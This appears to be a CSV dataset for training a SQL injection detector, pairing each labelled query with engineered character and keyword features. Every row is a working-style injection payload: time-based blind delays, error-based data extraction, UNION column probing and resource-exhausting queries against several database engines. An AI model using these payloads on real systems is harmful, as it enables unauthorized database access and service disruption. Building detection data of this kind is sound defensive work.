Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
"1""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,127,26,0,1,25,1,0,25,0,4,2,0,0,37,15,4,0
select   (  case when   (  6179  =  8476  )   then 6179 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,133,29,0,0,12,1,0,28,0,0,3,0,0,56,14,0,2
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",1,76,15,0,4,11,0,0,14,0,2,0,0,0,18,9,0,0
1'  )   where 4277  =  4277 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,364,75,1,0,61,1,0,74,0,11,2,0,0,96,53,10,1
-5039 union all select 2114#,1,28,5,0,0,2,0,0,4,0,0,1,0,0,14,8,0,1
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd",1,196,31,0,4,26,0,0,30,0,2,0,0,1,52,35,0,1
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,228,45,3,0,36,1,0,44,0,5,2,1,0,76,33,6,1
"1%'   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,118,20,3,0,19,1,0,19,1,1,3,0,0,32,15,0,0
"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,302,54,0,4,42,0,0,53,2,2,2,0,0,100,35,1,4
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""hxdd""  =  ""hxdd",1,105,21,0,3,15,0,0,21,0,1,1,0,0,36,1,0,2
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  # aetd",1,297,58,0,0,31,0,0,57,0,1,2,0,0,103,55,0,7
-1879%'   )    )    or 3038  =  3038,1,36,7,1,0,6,0,0,6,1,1,1,0,0,2,12,0,0
1%'   )    )    waitfor delay '0:0:5' and    (    (   '%'  =  ',1,63,12,6,0,15,0,0,11,2,1,0,0,0,15,4,0,0
select   (  case when   (  8663  =  7467  )   then 8663 else 1/  (  select 0  )   end  )  --,1,92,20,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2
"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",1,56,14,0,1,6,0,0,13,0,1,0,0,0,18,10,0,0
1'+  (  select emeu where 2310  =  2310,1,39,8,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1
"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,269,55,1,0,44,1,0,54,0,6,2,2,0,82,37,9,0
"1   )    )     )   union all select null,null,null#",1,51,8,0,0,6,0,0,7,0,0,0,3,0,26,1,3,1
"1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,144,24,1,0,15,1,0,23,0,1,3,0,0,76,16,0,2
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,86,8,0,0,13,0,0,7,0,0,0,10,0,54,1,10,1
"1  )   and elt  (  4249  =  4249,7259  )  ",1,42,9,0,0,5,0,0,9,0,1,0,0,0,6,13,0,0
"1%' union all select null,null,null,null#",1,41,5,1,0,6,0,0,4,1,0,0,4,0,30,1,4,1
"-9098' union all select 3476,3476,3476,3476,3476,3476#",1,54,5,1,0,8,0,0,4,0,0,1,0,0,14,28,0,1
1'+  (  select nxfp where 5006  =  5006,1,39,8,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1
"-7083 union all select 7705,7705,7705,7705,7705#",1,48,5,0,0,6,0,0,4,0,0,1,0,0,14,24,0,1
1'  )   and 2006  =  2006,1,25,6,1,0,3,0,0,5,0,1,0,0,0,3,9,0,0
select   (  case when   (  9986  =  8342  )   then 9986 else 9986*  (  select 9986 from information_schema.character_sets  )   end  )  #,1,136,22,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2
"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,169,30,0,1,19,1,0,29,0,1,3,0,0,82,17,0,2
"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,1,76,17,0,4,15,0,0,16,2,2,0,0,0,13,10,0,0
"1'  )   where 2725  =  2725 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,155,27,1,0,18,1,0,26,0,1,3,0,0,77,17,0,2
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,121,19,0,0,11,0,0,19,0,1,1,0,0,71,8,0,2
"1%"" waitfor delay '0:0:5'--",1,27,4,2,1,8,1,0,3,1,0,2,0,0,12,4,0,0
-6412%' or 4065  =  5815 and '%'  =  ',1,38,9,4,0,9,0,0,8,2,2,1,0,0,5,12,0,0
"1%""   )    )     )   union all select null,null--",1,49,8,0,1,8,1,0,7,1,0,2,2,0,22,1,2,1
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,87,19,1,0,12,0,0,18,0,0,1,0,0,30,2,0,2
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,83,7,0,1,14,0,0,6,1,0,0,10,0,54,1,10,1
"-7007  )   union all select 6704,6704--",1,39,6,0,0,5,1,0,5,0,0,3,0,0,14,12,0,1
1'   )    )    as uizu where 1774  =  1774,1,42,9,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0
"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",1,171,33,4,0,32,0,0,32,0,6,0,0,0,52,24,4,1
"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1,153,27,4,0,22,0,0,26,2,2,1,0,0,75,9,0,2
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,1,68,13,4,0,11,0,0,12,0,2,1,0,0,13,12,0,0
"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",1,63,7,0,1,11,1,0,6,1,0,3,0,0,14,24,0,1
"-6263%""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||ch",1,255,50,0,1,41,0,0,49,1,7,1,0,0,77,33,5,1
waitfor delay '0:0:5'  )  +',1,28,5,3,0,7,0,0,4,0,0,1,0,0,12,3,0,0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",1,349,74,0,4,60,0,0,73,0,12,0,0,0,92,49,10,1
-4882' order by 1#,1,18,4,1,0,3,0,0,3,0,0,1,0,0,7,5,0,1
1 where 2301  =  2301,1,21,5,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0
-9005 union all select 4410#,1,28,5,0,0,2,0,0,4,0,0,1,0,0,14,8,0,1
"-7324  )   or make_set  (  8486  =  6544,6544  )  ",1,50,9,0,0,7,0,0,9,0,1,1,0,0,9,16,0,0
1' or sleep  (  5  )   and 'udqz'  =  'udqz,1,43,10,4,0,7,0,0,9,0,2,0,0,0,18,2,0,0
"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,1,164,28,0,4,26,0,0,27,2,2,0,0,1,36,39,0,1
"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""qyew""  =  ""qyew",1,164,26,0,4,24,0,0,25,0,2,1,0,0,74,10,0,2
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",1,98,18,0,0,13,0,0,17,0,0,0,1,0,38,14,2,0
"1""  )   where 3084  =  3084 union all select null,null--",1,56,10,0,1,6,1,0,9,0,0,2,2,0,27,9,2,1
"-4993"" union all select 6959,6959,6959--",1,40,5,0,1,6,1,0,4,0,0,3,0,0,14,16,0,1
" end and    (    (   ""dmgj""  =  ""dmgj",1,37,7,0,3,6,0,0,7,0,1,0,0,0,14,0,0,0
"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,109,20,1,0,16,1,0,19,0,1,3,0,0,31,13,0,2
1  )   where 8813  =  8813,1,26,6,0,0,2,0,0,5,0,0,0,0,0,5,9,0,0
1'   )    )    and sleep  (  5  )  #,1,36,9,1,0,6,0,0,8,0,1,0,0,0,8,2,0,0
 (  8266  =  8266  )  *9900,1,27,6,0,0,4,0,0,6,0,0,1,0,0,0,12,0,0
"1"" and 7533  =  7533 and ""dqjp""  =  ""dqjp",1,41,9,0,4,6,0,0,8,0,2,0,0,0,14,9,0,0
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   -- sbvl",1,146,23,0,0,18,1,0,22,0,1,2,0,1,41,35,0,1
select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #,1,111,22,0,0,10,0,0,21,0,0,1,0,0,42,20,0,2
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,1,70,15,1,0,9,1,0,14,0,1,3,0,0,14,21,0,0
"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,166,27,0,1,20,1,0,26,0,0,2,0,1,54,32,0,0
"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,1,82,16,0,4,16,0,0,15,2,2,0,0,0,13,13,0,0
"-8894%""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113",1,255,51,0,1,41,0,0,50,1,7,1,0,0,76,36,6,1
"-3438""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +ch",1,255,55,0,1,34,0,0,54,0,1,7,0,0,73,35,7,2
-7901  )   order by 1--,1,23,5,0,0,4,1,0,4,0,0,3,0,0,7,5,0,1
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,95,20,1,0,14,0,0,19,1,0,1,0,0,30,2,0,2
"1'  )   where 6489  =  6489 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,166,28,1,0,22,1,0,27,0,1,2,0,1,38,47,0,1
"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,134,23,0,1,17,1,0,22,0,1,3,0,0,71,9,0,2
"-3261""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  ( ",1,255,53,0,1,41,0,0,53,0,7,1,0,0,68,37,6,1
1 where 7464  =  7464 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,113,24,0,0,10,1,0,23,0,0,2,0,1,36,21,0,1
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",1,296,58,0,0,31,0,0,57,0,1,2,0,0,102,55,0,7
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'ckfn' like 'ckfn",1,158,27,6,0,23,0,0,26,0,2,1,0,0,46,15,0,0
1'||  (  select 'uedy' where 8816  =  8816,1,42,8,3,0,7,0,0,7,0,1,0,0,0,15,9,0,1
"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1,195,32,1,0,15,0,0,31,0,1,1,0,0,122,12,0,2
-7951'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (,1,255,55,1,0,35,0,0,54,0,1,7,0,0,61,35,8,1
"1'   )    )    as ylyq where 2953  =  2953 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,215,36,1,0,18,1,0,35,0,1,3,0,0,120,20,0,2
"-4736'   )    )    or elt  (  5835  =  5509,5509  )   and    (    (   'iawg'  =  'iawg",1,86,16,4,0,14,0,0,15,0,2,1,0,0,16,16,0,0
"-5438""  )   union all select 3170,3170--",1,40,6,0,1,6,1,0,5,0,0,3,0,0,14,12,0,1
"-1368   )    )    union all select 1310,1310,1310,1310,1310#",1,60,7,0,0,8,0,0,6,0,0,1,0,0,14,24,0,1
"-1550' in boolean mode  )   union all select 9777,9777,9777--",1,61,9,1,0,7,1,0,8,0,0,3,0,0,27,16,0,1
"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,217,43,3,0,35,1,0,42,0,4,3,1,0,68,33,6,1
1 where 4372  =  4372,1,21,5,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0
"-8797""   )    )    order by 1#",1,30,6,0,1,5,0,0,5,0,0,1,0,0,7,5,0,1
"-9166""  )   as hlre where 4768  =  4768 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,154,30,4,1,20,1,0,29,0,3,3,0,0,63,26,0,1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1,78,17,1,0,10,0,0,17,0,1,1,0,0,28,2,0,2
"1' where 2964  =  2964 union all select null,null,null#",1,55,9,1,0,5,0,0,8,0,0,0,3,0,31,9,3,1
"1   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,138,28,0,0,26,1,0,27,0,4,2,0,0,37,15,4,0
"1'   )    )    and elt  (  4460  =  2665,2665  )   and    (    (   'qmzu'  =  'qmzu",1,83,16,4,0,13,0,0,15,0,2,0,0,0,17,13,0,0
"-1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",1,91,9,1,0,13,1,0,8,0,0,3,0,0,27,40,0,1
select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,1,59,11,3,0,9,0,0,10,0,1,0,0,0,24,1,0,1
"1""  )   as vzdq where 3160  =  3160",1,35,8,0,1,3,0,0,7,0,0,0,0,0,11,9,0,0
"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",1,161,30,4,4,23,0,0,29,0,4,0,0,0,64,15,0,1
"1""   )    )    order by 1#",1,26,6,0,1,4,0,0,5,0,0,0,0,0,7,2,0,1
"1%'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   '%'  =  '",1,158,26,4,0,26,0,0,25,2,2,1,0,0,66,10,0,2
1' and 4595  =  4595#,1,21,5,1,0,3,0,0,4,0,1,0,0,0,3,9,0,0
"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",1,119,14,3,0,17,0,0,13,0,1,1,0,0,37,48,0,2
"-7418 union all select 1340,1340,1340,1340,1340#",1,48,5,0,0,6,0,0,4,0,0,1,0,0,14,24,0,1
1'  )   where 6222  =  6222 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,105,23,1,0,14,1,0,22,0,1,3,0,0,32,10,0,2
"1""  )   where 7957  =  7957 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,130,23,2,1,18,1,0,22,0,1,3,0,0,37,23,0,0
"-1235""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 e",1,255,56,0,1,41,0,0,55,0,8,1,0,0,64,37,7,2
"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,155,27,1,0,17,1,0,26,0,1,4,0,0,80,16,0,3
"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",1,81,13,1,0,9,1,0,12,0,0,2,4,0,41,9,4,1
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",1,283,50,4,0,36,0,0,49,0,2,2,0,0,107,35,1,4
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",1,150,24,0,4,22,0,0,23,0,2,1,0,0,74,10,0,2
"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" like ""znzb",1,336,60,0,4,46,0,0,59,0,4,0,1,0,122,34,6,1
1'  )   where 8142  =  8142 waitfor delay '0:0:5'--,1,51,9,3,0,9,1,0,8,0,0,2,0,0,17,12,0,0
"-1275"" union all select 7861,7861,7861,7861,7861#",1,49,5,0,1,7,0,0,4,0,0,1,0,0,14,24,0,1
"1""   )    )     )   and elt  (  2421  =  9612,9612  )   and    (    (     (  ""gbdx"" like ""gbdx",1,94,18,0,4,14,0,0,17,0,2,0,0,0,21,13,0,0
"1%'   )    )    union all select null,null,null,null,null--",1,59,7,1,0,10,1,0,6,1,0,2,5,0,34,1,5,1
select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,1,121,22,0,0,12,1,0,21,0,0,3,0,0,53,17,0,2
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",1,116,18,3,0,13,0,0,17,0,1,1,0,0,73,3,0,2
"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",1,81,7,1,0,13,0,0,6,0,0,1,0,0,14,40,0,1
"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji",1,121,21,0,0,12,0,0,20,0,1,1,0,0,69,8,0,2
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'ajka'  =  'ajka,1,441,95,4,0,75,0,0,94,0,15,0,0,0,112,51,13,2
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,118,18,1,0,16,0,0,18,0,1,1,0,0,62,10,0,2
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1,380,76,2,0,56,0,0,75,0,5,2,2,0,119,43,9,2
"1%'  )   union all select null,null,null,null,null,null,null--",1,62,6,1,0,11,1,0,5,1,0,2,7,0,42,1,7,1
end-- elvi,1,10,2,0,0,2,1,0,1,0,0,2,0,0,7,0,0,0
"-6987' union all select 4721,4721--",1,35,5,1,0,5,1,0,4,0,0,3,0,0,14,12,0,1
"-5360' where 8178  =  8178 union all select 8178,8178,8178--",1,60,9,1,0,7,1,0,8,0,0,3,0,0,19,24,0,1
"1"" and   (  3020  =  3020  )  *6703 and ""tnzp"" like ""tnzp",1,57,12,0,4,8,0,0,11,0,2,1,0,0,18,13,0,0
"-8875""  )   where 8428  =  8428 or 1519  =  5756--",1,50,10,0,1,7,1,0,9,0,1,3,0,0,7,20,0,0
1   )    )    as xzcl where 2332  =  2332,1,41,9,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc,1,161,30,8,0,23,0,0,29,0,4,0,0,0,64,15,0,1
"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   ",1,255,53,0,1,37,0,0,53,0,6,1,0,0,68,45,5,1
"1'||  (  select 'wcad' from dual where 4262  =  4262 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,103,21,3,0,14,0,0,20,0,2,0,0,0,34,18,0,1
-9771' or 5113  =  5365,1,23,5,1,0,3,0,0,4,0,1,1,0,0,2,12,0,0
"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",1,190,33,1,0,20,0,0,33,0,0,1,0,1,60,34,0,3
"1',  (  select   (  case when   (  7711  =  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )   ",1,147,24,1,0,15,0,0,24,0,0,1,0,0,65,18,1,2
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",1,75,5,1,0,13,0,0,4,1,0,1,0,0,14,44,0,1
-4965  )   as imga where 3705  =  3705 union all select 3705--,1,62,12,0,0,5,1,0,11,0,0,3,0,0,25,16,0,1
"1%'  )   union all select null,null,null,null--",1,47,6,1,0,8,1,0,5,1,0,2,4,0,30,1,4,1
"1   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   3366  =  3366",1,321,58,0,0,41,0,0,57,0,4,0,1,0,110,42,6,1
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",1,169,27,0,4,19,0,0,26,0,2,1,0,0,87,8,0,2
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,234,47,0,1,40,0,0,47,0,6,0,2,0,71,29,9,0
"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",1,67,12,1,0,6,0,0,11,0,0,1,0,0,25,20,0,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy",1,132,21,2,3,19,0,0,20,0,1,1,0,0,46,10,0,1
1'||  (  select 'ymre' where 8681  =  8681,1,42,8,3,0,7,0,0,7,0,1,0,0,0,15,9,0,1
1'   )    )    and 3526  =  1354,1,32,7,1,0,4,0,0,6,0,1,0,0,0,3,9,0,0
"-5496 union all select 2099,2099,2099#",1,38,5,0,0,4,0,0,4,0,0,1,0,0,14,16,0,1
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""wcze""  =  ""wcze",1,102,21,0,4,14,0,0,20,0,1,1,0,0,41,2,0,2
select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,1,136,22,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2
